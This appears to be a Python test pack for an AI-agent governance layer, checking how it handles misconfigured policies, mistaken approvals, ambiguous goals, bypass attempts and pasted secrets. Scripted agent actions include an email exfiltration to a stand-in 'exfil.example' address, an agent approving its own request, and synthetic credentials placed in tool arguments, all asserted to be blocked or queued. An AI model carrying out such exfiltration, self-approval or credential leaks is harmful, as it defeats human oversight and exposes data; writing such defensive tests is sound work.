"""Human-error scenario pack: misconfigurations, fat-fingered approvals,
ambiguous prompts, bypass under pressure, and secret pastes.

Every scenario runs the FULL governed loop (Agent -> ModelBackend ->
ToolExecutor.call -> identity -> role allowlist -> DLP -> policy ->
approval gate -> audit) via the agentkit prototype and asserts the
governance layer's response: blocked / allowed / queued / audited.

Behavioral drivers: the careless archetypes (careless-typo,
careless-paste-secret, careless-misconfig, careless-bypass, ...) in
workstreams/realagent/profiles/ — this pack is the executable version
of the shapes those profiles replay.

Determinism contract: seeded RNG, no wall-clock assertions, no network,
no real sleeps, synthetic data only.

Module contract (tests/run_realistic.py): SCENARIO metadata + run().
Each scenario_he_*() returns a dict of check results on success and
raises (AssertionError) on failure; run() executes them in a fixed
order and raises a combined AssertionError if any fail.
"""

import random
import sys
import tempfile
from pathlib import Path

import tests.harness  # noqa: F401 -- dev-key opt-in (tests/__init__.py)

from agentkit.agent import Agent
from agentkit.approver import FatFingerApprover, ScriptedApprover
from agentkit.model_backend import Action, ModelBackend, ScriptedBackend
from agentkit.runlib import (DEFAULT_POLICY, FIXTURES, chain_ok, find_entries,
                             make_agent_run)

SCENARIO = {
    "id": "human-error-pack",
    "title": "Human-error scenarios: misconfiguration, fat-fingered "
             "approval, ambiguous goal, bypass under pressure, secret paste",
    "scenarios": ["HE-1a", "HE-1b", "HE-2", "HE-3", "HE-4a", "HE-4b",
                  "HE-5"],
}

_BASE_SEED = 20260921

# Well-known fake credential shapes (synthetic, from the run fixtures).
# DLP credential patterns fire on these deterministically.
_FAKE_AWS_KEY = "AKIAIOSFODNN7FAKEKEY1"
_FAKE_TOKEN = "ghp_syntheticTestToken1234567890"


def _agent(agent_id, role, principal, ctx, backend, approver,
           goal="scenario goal"):
    ident = ctx["executor"].mint_identity(agent_id, role, principal)
    return Agent(agent_id=agent_id, role=role, principal=principal,
                 goal=goal, backend=backend, executor=ctx["executor"],
                 approver=approver, identity=ident)


def _policy_file_under_tmpdir(name, text):
    """Write a policy variant into the runner's private TMPDIR subdir so
    nothing leaks under the bare /tmp/gov-run root."""
    d = Path(tempfile.mkdtemp(prefix=name + "-"))
    p = d / "policy.yaml"
    p.write_text(text, encoding="utf-8")
    return str(p)


_EMPTY_POLICIES = """\
# HE-1a: misconfigured policy — the policies: section is empty.
# Semantics must be deny-by-default (fail closed), never allow-by-default.
version: 2
roles:
  researcher: [read_file, write_file, api_call, http_post, send_email]
rate_limit:
  max_identical_calls: 10
  max_egress_bytes_per_run: 262144
  max_sends_per_run: 10
  max_writes_per_run: 50
  max_deletes_per_run: 20
egress:
  domain_allowlist: [synthetic.local, localhost, 127.0.0.1]
approvals:
  ttl_hours: 24
campaign_allowlist: []
log_limits:
  max_log_bytes: 104857600
policies: []
"""


def _drop_rule(policy_text, rule_id):
    """Remove one rule block ('  - id: <rule_id>' .. next rule) from a
    policy file's text. Used to model a misconfiguration that drops a
    deny rule."""
    marker = "  - id: %s\n" % rule_id
    start = policy_text.index(marker)
    nxt = policy_text.find("\n  - id: ", start + len(marker))
    if nxt == -1:
        return policy_text[:start].rstrip() + "\n"
    return policy_text[:start] + policy_text[nxt + 1:]


# ---------------------------------------------------------------------------
# HE-1a: misconfigured policy — empty policies: section.
# Expected: every action denied (default_deny), fail-closed, audited.
# ---------------------------------------------------------------------------
def scenario_he_1a():
    checks = {}
    ctx = make_agent_run(
        policy_path=_policy_file_under_tmpdir("he1a", _EMPTY_POLICIES))
    agent = _agent("he1a-agent", "researcher", "research-org", ctx,
                   ScriptedBackend([
                       {"kind": "tool", "tool": "read_file",
                        "args": {"path": "notes.txt"},
                        "reasoning": "read notes"},
                       {"kind": "tool", "tool": "api_call",
                        "args": {"endpoint": "https://api.synthetic.local/x"},
                        "reasoning": "lookup"},
                       {"kind": "tool", "tool": "write_file",
                        "args": {"path": "out.txt", "content": "data"},
                        "reasoning": "write"},
                       {"kind": "tool", "tool": "send_email",
                        "args": {"to": "team@synthetic.local",
                                 "subject": "s", "body": "b"},
                        "reasoning": "send"},
                   ]),
                   ScriptedApprover(default=None),
                   goal="Do the research task.")
    rep = agent.run()
    denied = [o for _, o in agent.history if o.status == "denied"]
    checks["all_four_actions_denied"] = len(denied) == 4
    assert checks["all_four_actions_denied"], \
        "expected 4 denials, got %d: %s" % (
            len(denied), [(a.tool, o.status) for a, o in agent.history])

    entries = ctx["read_log"]()
    tool_entries = [e for e in entries if e.get("event") == "tool_call"]
    flags = {e.get("flag") for e in tool_entries}
    checks["default_deny_audited"] = flags == {"default_deny"}
    assert checks["default_deny_audited"], \
        "expected only default_deny flags, got %r" % (flags,)
    checks["nothing_executed_or_queued"] = not any(
        e.get("decision") in ("allowed_executed", "approved_executed",
                              "auto_approved_executed", "queued_pending",
                              "execution_authorized")
        for e in tool_entries)
    assert checks["nothing_executed_or_queued"], \
        "fail-closed violated: some action executed or queued"
    checks["chain_ok"] = chain_ok(ctx["run_dir"])
    assert checks["chain_ok"], "audit chain broken"
    return {"scenario": "HE-1a", "checks": checks,
            "outcome": rep.outcome}


# ---------------------------------------------------------------------------
# HE-1b: misconfigured policy — deny-egress-unallowlisted rule dropped.
# Expected: the exfil attempt degrades deny -> queue (approval-outbound-sends)
# but is NEVER executed without a human; audit shows queued_pending.
# ---------------------------------------------------------------------------
def scenario_he_1b():
    checks = {}
    default_text = Path(DEFAULT_POLICY).read_text(encoding="utf-8")
    degraded = _drop_rule(default_text, "deny-egress-unallowlisted")
    assert "  - id: deny-egress-unallowlisted\n" not in degraded, \
        "the deny-egress-unallowlisted rule block must be removed " \
        "(block-marker check; other rules may legitimately reference " \
        "the rule id in their reason text, e.g. F94)"
    ctx = make_agent_run(
        policy_path=_policy_file_under_tmpdir("he1b", degraded))
    agent = _agent("he1b-agent", "researcher", "research-org", ctx,
                   ScriptedBackend([
                       {"kind": "tool", "tool": "send_email",
                        "args": {"to": "collector@exfil.example",
                                 "subject": "data",
                                 "body": "exfiltrating under misconfiguration"},
                        "reasoning": "send the data"},
                   ]),
                   ScriptedApprover(default=None),
                   goal="Send the data out.")
    rep = agent.run()
    checks["agent_paused_awaiting_approval"] = (
        rep.outcome == "awaiting_approval")
    assert checks["agent_paused_awaiting_approval"], \
        "expected awaiting_approval, got %r" % (rep.outcome,)
    _action, obs = agent.history[0]
    checks["send_queued_not_denied"] = obs.status == "awaiting_approval"
    assert checks["send_queued_not_denied"], \
        "expected the send to queue (degraded deny->queue), got %r" % (
            obs.status,)

    entries = ctx["read_log"]()
    queued = find_entries(entries, event="tool_call",
                          decision="queued_pending")
    checks["queued_pending_audited"] = len(queued) == 1
    assert checks["queued_pending_audited"], \
        "expected one queued_pending entry, got %d" % len(queued)
    checks["queued_via_outbound_sends_rule"] = (
        queued[0].get("policy_id") == "approval-outbound-sends")
    assert checks["queued_via_outbound_sends_rule"], \
        "expected approval-outbound-sends, got %r" % queued[0].get("policy_id")

    # No human ever approved: a sweep must execute nothing.
    done = ctx["executor"].execute_approved()
    checks["sweep_executed_nothing"] = done == []
    assert checks["sweep_executed_nothing"], \
        "execute_approved ran without approval: %r" % (done,)
    checks["never_executed"] = not any(
        e.get("decision") in ("allowed_executed", "approved_executed",
                              "auto_approved_executed", "execution_authorized")
        and e.get("tool") == "send_email" for e in entries)
    assert checks["never_executed"], "exfil executed without a human"
    checks["chain_ok"] = chain_ok(ctx["run_dir"])
    assert checks["chain_ok"], "audit chain broken"
    return {"scenario": "HE-1b", "checks": checks}


# ---------------------------------------------------------------------------
# HE-2: fat-fingered approval — the operator intends to approve the benign
# queued request but approves the dangerous one instead.
# Expected: the wrongly-approved action executes WITH full attribution
# (approval_decision names the decider; executed args are integrity-bound
# to exactly what was approved); the benign request stays pending; risk
# ordering surfaced the dangerous item first.
# ---------------------------------------------------------------------------
def scenario_he_2():
    checks = {}
    ctx = make_agent_run()
    ex = ctx["executor"]
    q = ctx["approvals"]
    ident = ex.mint_identity("he2-agent", "researcher", "research-org")
    leave_pending = ScriptedApprover(default=None)

    # Request 1 (benign): a routine status email. Queued, left pending.
    a1 = Agent(agent_id="he2-agent", role="researcher",
               principal="research-org", goal="Send a status update.",
               backend=ScriptedBackend([
                   {"kind": "tool", "tool": "send_email",
                    "args": {"to": "team@synthetic.local",
                             "subject": "status", "body": "all quiet"},
                    "reasoning": "routine update"},
               ]),
               executor=ex, approver=leave_pending, identity=ident)
    r1 = a1.run()
    assert r1.outcome == "awaiting_approval", r1.outcome
    benign_id = r1.pending_approval_ids[0]

    # Request 2 (dangerous): read notes, then send a verbatim excerpt.
    # Carries read content -> read_before_send, untrusted-influenced.
    excerpt = FIXTURES["notes.txt"][:40]
    assert len(excerpt) >= 32  # correlation window needs >= 32 chars
    dangerous_args = {"to": "team@synthetic.local",
                      "subject": "customer data",
                      "body": "extract: " + excerpt}
    a2 = Agent(agent_id="he2-agent", role="researcher",
               principal="research-org", goal="Send the extract.",
               backend=ScriptedBackend([
                   {"kind": "tool", "tool": "read_file",
                    "args": {"path": "notes.txt"}, "reasoning": "read"},
                   {"kind": "tool", "tool": "send_email",
                    "args": dangerous_args, "reasoning": "send extract"},
               ]),
               executor=ex, approver=leave_pending, identity=ident)
    r2 = a2.run()
    assert r2.outcome == "awaiting_approval", r2.outcome
    dangerous_id = r2.pending_approval_ids[0]
    assert benign_id != dangerous_id

    # The layer surfaces the dangerous item first (highest risk first).
    ordered = q.pending_risk_sorted()
    checks["risk_ordering_dangerous_first"] = (
        len(ordered) == 2 and ordered[0]["id"] == dangerous_id)
    assert checks["risk_ordering_dangerous_first"], \
        "risk ordering did not surface the dangerous item first: %s" % (
            [r["id"] for r in ordered],)

    # The operator opens the BENIGN request's review screen but clicks
    # approve on the WRONG row (the dangerous one).
    driver = FatFingerApprover(intended_id=benign_id,
                               actual_id=dangerous_id)
    checks["benign_left_pending_by_operator"] = (
        driver.resolve(q, benign_id) == "pending")
    assert checks["benign_left_pending_by_operator"]
    checks["dangerous_wrongly_approved"] = (
        driver.resolve(q, dangerous_id) == "approved")
    assert checks["dangerous_wrongly_approved"], \
        "fat-finger approval did not go through"

    done = ex.execute_approved()
    entries = ctx["read_log"]()
    checks["dangerous_executed"] = any(
        e.get("event") == "tool_call"
        and e.get("decision") == "approved_executed"
        and e.get("approval_id") == dangerous_id
        for e in entries)
    assert checks["dangerous_executed"], \
        "wrongly-approved request did not execute: %r" % (done,)

    # Full attribution: the approval_decision names the decider and the
    # intended (wrong) target.
    decisions = [e for e in entries
                 if e.get("event") == "approval_decision"
                 and e.get("approval_id") == dangerous_id]
    checks["approval_decision_attributed"] = (
        len(decisions) == 1
        and decisions[0].get("decided_by") == "human-operator"
        and benign_id in decisions[0].get("reason", ""))
    assert checks["approval_decision_attributed"], \
        "approval_decision not fully attributed: %r" % (decisions,)
    # Args integrity: what executed is EXACTLY what was approved. The audit
    # log stores send_email bodies in redacted summary form (DLP), so the
    # comparison is against the APPROVED record's args (same summary form),
    # and the summary's byte length binds it to the approved content.
    approved_record = q.get(dangerous_id)
    approved_args = approved_record["args"]
    executed = [e for e in entries
                if e.get("event") == "tool_call"
                and e.get("decision") in ("execution_authorized",
                                          "approved_executed")
                and e.get("approval_id") == dangerous_id]
    checks["executed_args_match_approved"] = (
        len(executed) >= 1
        and all(e.get("args", {}) == approved_args for e in executed)
        and approved_args.get("to") == dangerous_args["to"]
        and approved_args.get("subject") == dangerous_args["subject"]
        and approved_args.get("body", {}).get("bytes")
        == len(dangerous_args["body"]))
    assert checks["executed_args_match_approved"], \
        "executed args differ from approved args: %r vs %r" % (
            [e.get("args") for e in executed], approved_args)
    # The benign request is still pending — the error did not launder it.
    checks["benign_still_pending"] = q.get(benign_id)["status"] == "pending"
    assert checks["benign_still_pending"], \
        "benign request status: %r" % (q.get(benign_id)["status"],)
    checks["chain_ok"] = chain_ok(ctx["run_dir"])
    assert checks["chain_ok"], "audit chain broken"
    return {"scenario": "HE-2", "checks": checks}


# ---------------------------------------------------------------------------
# HE-3: ambiguous goal ("clean up the old reports").
# Expected: the backend emits clarify; the agent pauses with
# clarification_needed; ZERO delete_file attempts in counters/audit.
# ---------------------------------------------------------------------------
class _AmbiguousGoalBackend(ModelBackend):
    """Never guesses at destructive actions: vague cleanup goals produce
    a clarification question, not a delete."""

    VAGUE_WORDS = ("clean up", "old", "tidy")

    def next_action(self, goal, history):
        if (not history and any(w in goal.lower()
                                for w in self.VAGUE_WORDS)):
            return Action(
                kind="clarify",
                question=("Which reports do you mean by 'old reports'? "
                          "Please name the files or give a cutoff date — "
                          "I will not delete anything until you confirm."),
                reasoning="goal is ambiguous; must not guess at deletes")
        return Action(kind="finish", reasoning="nothing to do")


def scenario_he_3():
    checks = {}
    ctx = make_agent_run()
    agent = _agent("he3-agent", "coder", "dev-org", ctx,
                   _AmbiguousGoalBackend(),
                   ScriptedApprover(default=None),
                   goal="Clean up the old reports.")
    rep = agent.run()
    checks["paused_for_clarification"] = (
        rep.outcome == "clarification_needed")
    assert checks["paused_for_clarification"], \
        "expected clarification_needed, got %r" % (rep.outcome,)
    checks["question_asked"] = bool(rep.clarification_question
                                    and "old reports" in
                                    rep.clarification_question)
    assert checks["question_asked"], \
        "no useful clarification question: %r" % (
            rep.clarification_question,)
    checks["no_delete_in_counters"] = (
        "delete_file" not in ctx["executor"].counters)
    assert checks["no_delete_in_counters"], \
        "delete_file was attempted: %r" % (ctx["executor"].counters,)
    entries = ctx["read_log"]()
    checks["no_delete_in_audit"] = not any(
        e.get("event") == "tool_call" and e.get("tool") == "delete_file"
        for e in entries)
    assert checks["no_delete_in_audit"], "delete_file reached the audit log"
    checks["chain_ok"] = chain_ok(ctx["run_dir"])
    assert checks["chain_ok"], "audit chain broken"
    return {"scenario": "HE-3", "checks": checks}


# ---------------------------------------------------------------------------
# HE-4a: operator bypass under time pressure — break-glass with NO
# provisioned ticket.
# Expected: break_glass refused (ValueError), break_glass_refused audited,
# the queued item stays pending, nothing executes.
# ---------------------------------------------------------------------------
def scenario_he_4a():
    checks = {}
    ctx = make_agent_run()
    ex = ctx["executor"]
    q = ctx["approvals"]
    agent = _agent("he4a-agent", "researcher", "research-org", ctx,
                   ScriptedBackend([
                       {"kind": "tool", "tool": "send_email",
                        "args": {"to": "team@synthetic.local",
                                 "subject": "incident", "body": "help"},
                        "reasoning": "urgent incident update"},
                   ]),
                   ScriptedApprover(default=None),
                   goal="Send the incident update NOW.")
    rep = agent.run()
    assert rep.outcome == "awaiting_approval", rep.outcome
    aid = rep.pending_approval_ids[0]

    # The operator, under time pressure, tries break-glass — but no ticket
    # was provisioned out-of-band before the run.
    operator = ex.mint_identity("operator-1", "approver", "human-org")
    raised = None
    try:
        q.break_glass(aid, "INCIDENT-1234: restore service now", operator,
                      ticket_id=None)
    except ValueError as e:
        raised = e
    checks["break_glass_refused"] = raised is not None
    assert checks["break_glass_refused"], \
        "break_glass without a provisioned ticket was NOT refused"

    entries = ctx["read_log"]()
    refused = [e for e in entries
               if e.get("event") == "break_glass_refused"
               and e.get("approval_id") == aid]
    checks["refusal_audited"] = len(refused) == 1
    assert checks["refusal_audited"], \
        "break_glass_refused not audited: %r" % (refused,)
    checks["item_still_pending"] = q.get(aid)["status"] == "pending"
    assert checks["item_still_pending"], \
        "queued item status after refused break-glass: %r" % (
            q.get(aid)["status"],)
    done = ex.execute_approved()
    checks["nothing_executed"] = done == []
    assert checks["nothing_executed"], \
        "something executed after refused break-glass: %r" % (done,)
    checks["chain_ok"] = chain_ok(ctx["run_dir"])
    assert checks["chain_ok"], "audit chain broken"
    return {"scenario": "HE-4a", "checks": checks}


# ---------------------------------------------------------------------------
# HE-4b: the requesting agent tries to approve its own queued request.
# Expected: decide() raises ValueError (separation of duties); the attempt
# is audit-logged; the item stays pending; nothing executes.
# ---------------------------------------------------------------------------
def scenario_he_4b():
    checks = {}
    ctx = make_agent_run()
    ex = ctx["executor"]
    q = ctx["approvals"]
    agent = _agent("he4b-agent", "researcher", "research-org", ctx,
                   ScriptedBackend([
                       {"kind": "tool", "tool": "send_email",
                        "args": {"to": "team@synthetic.local",
                                 "subject": "s", "body": "b"},
                        "reasoning": "send"},
                   ]),
                   ScriptedApprover(default=None),
                   goal="Send the email.")
    rep = agent.run()
    assert rep.outcome == "awaiting_approval", rep.outcome
    aid = rep.pending_approval_ids[0]

    raised = None
    try:
        q.decide(aid, True, "approving my own request",
                 decided_by="he4b-agent")
    except ValueError as e:
        raised = e
    checks["self_approval_rejected"] = raised is not None
    assert checks["self_approval_rejected"], \
        "agent approved its own request without error"

    entries = ctx["read_log"]()
    attempts = [e for e in entries
                if e.get("event") == "approval_decision_attempt"
                and e.get("approval_id") == aid
                and e.get("decision") == "rejected_attempt"]
    checks["attempt_audited"] = len(attempts) == 1
    assert checks["attempt_audited"], \
        "self-approval attempt not audit-logged: %r" % (attempts,)
    checks["item_still_pending"] = q.get(aid)["status"] == "pending"
    assert checks["item_still_pending"]
    checks["nothing_executed"] = not any(
        e.get("event") == "tool_call"
        and e.get("decision") in ("approved_executed",
                                  "execution_authorized")
        for e in entries)
    assert checks["nothing_executed"]
    checks["chain_ok"] = chain_ok(ctx["run_dir"])
    assert checks["chain_ok"], "audit chain broken"
    return {"scenario": "HE-4b", "checks": checks}


# ---------------------------------------------------------------------------
# HE-5: the operator pastes a secret into a tool argument (send_email body
# and api_call params).
# Expected: denied (dlp-credential-block) BEFORE execution; the raw secret
# is absent from actions.jsonl (redaction at rest — blocked args are
# stored as a bytes/sha256 summary, never the raw value).
# ---------------------------------------------------------------------------
def scenario_he_5():
    checks = {}
    ctx = make_agent_run()
    agent = _agent("he5-agent", "researcher", "research-org", ctx,
                   ScriptedBackend([
                       {"kind": "tool", "tool": "send_email",
                        "args": {"to": "team@synthetic.local",
                                 "subject": "deploy key",
                                 "body": "the deploy key is "
                                         + _FAKE_AWS_KEY + " — do not share"},
                        "reasoning": "share the key with the team"},
                       {"kind": "tool", "tool": "api_call",
                        "args": {"endpoint": "https://api.synthetic.local/v1",
                                 "params": {"token": _FAKE_TOKEN}},
                        "reasoning": "call the api with the token"},
                   ]),
                   ScriptedApprover(default=None),
                   goal="Share the credentials with the team.")
    rep = agent.run()
    denied = [o for _, o in agent.history if o.status == "denied"]
    checks["both_pastes_denied"] = len(denied) == 2
    assert checks["both_pastes_denied"], \
        "expected 2 DLP denials, got %d: %s" % (
            len(denied), [(a.tool, o.status, o.note) for a, o in
                          agent.history])
    checks["denied_by_dlp_credential_block"] = all(
        "dlp-credential-block" in o.note for _, o in agent.history
        if o.status == "denied")
    assert checks["denied_by_dlp_credential_block"], \
        "denial was not dlp-credential-block: %s" % (
            [o.note for _, o in agent.history if o.status == "denied"],)

    entries = ctx["read_log"]()
    dlp_denials = find_entries(entries, event="tool_call",
                               decision="denied",
                               policy_id="dlp-credential-block")
    checks["dlp_denials_audited"] = len(dlp_denials) == 2
    assert checks["dlp_denials_audited"], \
        "expected 2 audited dlp-credential-block denials, got %d" % (
            len(dlp_denials),)

    raw = (ctx["run_dir"] / "actions.jsonl").read_text(encoding="utf-8")
    checks["aws_key_absent_at_rest"] = _FAKE_AWS_KEY not in raw
    assert checks["aws_key_absent_at_rest"], \
        "raw AWS key present in actions.jsonl"
    checks["token_absent_at_rest"] = _FAKE_TOKEN not in raw
    assert checks["token_absent_at_rest"], \
        "raw token present in actions.jsonl"
    checks["chain_ok"] = chain_ok(ctx["run_dir"])
    assert checks["chain_ok"], "audit chain broken"
    return {"scenario": "HE-5", "checks": checks}


_SCENARIOS = [
    ("HE-1a", scenario_he_1a),
    ("HE-1b", scenario_he_1b),
    ("HE-2", scenario_he_2),
    ("HE-3", scenario_he_3),
    ("HE-4a", scenario_he_4a),
    ("HE-4b", scenario_he_4b),
    ("HE-5", scenario_he_5),
]


def run():
    """Run every human-error scenario; raise a combined AssertionError on
    any failure. Returns {"scenario": pack id, "scenarios": {...}}."""
    random.seed(_BASE_SEED)
    results = {}
    failures = []
    for sid, fn in _SCENARIOS:
        try:
            results[sid] = fn()
        except Exception as e:  # noqa: BLE001 -- aggregated below
            failures.append("%s: %s: %s" % (sid, type(e).__name__, e))
    if failures:
        raise AssertionError(
            "human-error pack: %d/%d scenarios failed:\n%s"
            % (len(failures), len(_SCENARIOS), "\n".join(failures)))
    return {"scenario": SCENARIO["id"], "scenarios": results}


if __name__ == "__main__":
    import json

    sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
    ws = Path(__file__).resolve().parent.parent.parent.parent \
        / "workstreams" / "realagent"
    if ws.is_dir():
        sys.path.insert(0, str(ws))
    print(json.dumps(run(), indent=2, default=str))
